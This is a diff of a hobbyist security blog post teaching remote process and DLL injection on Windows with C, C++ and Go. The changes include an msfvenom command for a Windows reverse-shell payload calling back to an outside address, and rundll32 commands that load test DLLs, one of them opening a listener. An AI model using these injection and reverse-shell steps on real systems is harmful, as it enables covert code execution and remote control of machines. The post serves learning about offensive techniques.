@@ -11,11 +11,21 @@ published: true
 
 > Cassin's Finch (Male), Carpodacus cassinii, Cabin Lake Viewing Blinds, Deschutes National Forest, Near Fort Rock, Oregon - www.naturespicsonline.com explicitly releases to public domain  
 
-## We're going to be injecting some DLLs in a remote running system process.  
+## We're going to be injecting some DLLs in a remote running system process by calling Windows kernel32.dll functions...
 
-** The first thing we're going to do is try injecting some basic shellcode into a remote process. Letz started with some C...**  
+- OpenProcess()
+- VirtualAllocEx()
+- WriteProcessMemory()
+- CreateRemoteThread()
+- CloseHandle(processHandle)  
 
-## Take a look at Red Team Notes for a basic example  
+  
+
+**I'm making the assumption you have mingw64 or the MSVC C++ developer tools (putting this here for me: "VC++ 2017 version 15.9 v14.16" because dumpbin.exe) installed on the Windows box, probably the Go compiler. Also assuming compiling from powershell (paths may be wonky otherwise)...**
+
+**The first thing we're going to do is try injecting some basic shellcode into a remote process just as a quick demo in case you've never done this before and actually the place I went to learn the most basic syntax of the calls. Letz get started with some C...**
+
+## Take a look at Red Team Notes for a basic example of shellcode injection into a remote process. 
 
 **https://www.ired.team/offensive-security/code-injection-process-injection/process-injection**  
 
@@ -114,10 +124,10 @@ to
 processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
 ```  
 
-**You should also probably change teh payload, cuz ya know random shellcod3z from teh internetz, plus Mdsvex just doesn't parse this correctly on the blog and I'm in no hurry to figure out why... We as humans typically don't change until we have to...**
+**You should also probably change teh payload, cuz ya know random shellcod3z from teh internetz, plus Mdsvex just doesn't parse this correctly on the blog (watch for missing '\' in any command line commands) and I'm in no hurry to figure out why... We as humans typically don't change until we have to...**
 
 ```  
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f c -b "\x00"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f c -b "\\x00"
 ```  
 
 ![](/go-remote-dll-process-injection/example-1-shellcode.png)  
@@ -133,14 +143,6 @@ gcc example-1.c -o example-1.exe
 ![](/go-remote-dll-process-injection/example-1-netstat.png)  
 
 ## As you can see, our l33t haxor script injected itself into the target process and the shellcode was executed. Notepad is trying to reach out to a IP on the interweb, the POC script worked... So, what does this teach us?  
-
-**We need to use some functions from the Wind0ws kernel32.dll to make this happen..**
-
-- OpenProcess()
-- VirtualAllocEx()
-- WriteProcessMemory()
-- CreateRemoteThread()
-- CloseHandle(processHandle)
 
 **You can search the web for these calls to learn more about their parameters, I'm not going over that here, we don't know anything and we just run teh cod3s, remember?**  
 
@@ -200,12 +202,12 @@ x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
 **Let's test the DLL...**  
 
 ```  
-rundll32.exe c:\meow.dll,DllMain
+rundll32.exe c:\\meow.dll,DllMain
 ```  
 
-**OMG, its s000 cUte!!!!**  
+**teh skript kat**  
 
-## Ok, no more distractions on to the main code...  
+## Ok, no more distractions on to the main C++ code...  
 
   - example-2.cpp
 ```cpp  
@@ -319,7 +321,7 @@ x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -s -ffunctio
 
 ## Enough messing around, we came here because of t3h GoLang...  
 
-**GoLang go brrrrr... make dll injekt**  
+**GoLang go brrrrr... make dll injekt... We leverage the power of sycall, notice we are not using golang.org/x/sys/windows here...**  
 
 - example-3.go  
 
@@ -555,12 +557,14 @@ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buil
 ## Let's try running rundll32 against our new dll. We have an exported function named GobServer.  
 
 ```  
-rundll32 c:\gob-server.dll,GobServer
+rundll32 c:\\gob-server.dll,GobServer
 ```  
 
 ![](/go-remote-dll-process-injection/example-4-gob-server.png)  
 
 ##  So, it looks like our gob server DLL works, our Windows box is now listening for a client on port 1234...  
+
+**you probably want to kill that process...**
 
 **So, how do we call the exported dll function GobServer now that we aren't just using the default MainDll exported function???**  
 
@@ -699,7 +703,7 @@ func main() {
 	fmt.Printf("wp1: %#x\n", wp1)
 	fmt.Printf("wp2: %#x\n", wp2)
 
-	// start new thread - Load the dll into memory
+	// start new thread - Load the dll
 	crt1, crt2, err := createRemoteThread.Call(
 		ph,
 		0,
@@ -798,7 +802,19 @@ func main() {
 }
 ```  
 
-## This is the OG code base I started working on when originally writing this post, this post is actually in its second iteration, because I got all the way to the end only to realize I needed to dig deeper and understand memory addressing and threads a bit better. Its kinda gross and borked, but the cool thing is it loads a local dll very well, and is thus perfect for testing the gob server and client.  It also has the functionality to find a process id by name, so you may want to snag that... It does use the "golang.org/x/sys/windows" so you may need to run 'go init mod foo'. Not changing it, more here as a junkyard and something I can look back at and laugh, or at least smile about...
+## The following is a borked, early version of my code when initially writing this post. The cool thing is it loads a local dll very well, and is thus perfect for testing the gob server and client.  It also has the functionality to find a process id by name using CreateToolhelp32Snapshot, Process32FirstW, and Process32NextW. It does use "golang.org/x/sys/windows" so you need to run these commands first to install the package before running.
+
+```  
+go mod init example-5
+```  
+
+**then**
+
+```  
+go get -u golang.org/x/sys/windows
+```  
+
+**I would honestly leave it out, and refactor this based on the previous code I provided.**  
 
 - example-5.go  
 
@@ -1013,7 +1029,8 @@ usage:
 go run example-5 notepad.exe
 ```  
 
-![](/go-remote-dll-process-injection/example-5-success.png)
+![](/go-remote-dll-process-injection/example-5-success.png)  
+> skript name in photo in different than example-5, but is the same code.
 
 ## What a week. Its been awesome researching and writing this. Hit me up and connect, especially if you like teh G0L4ngz.  
 
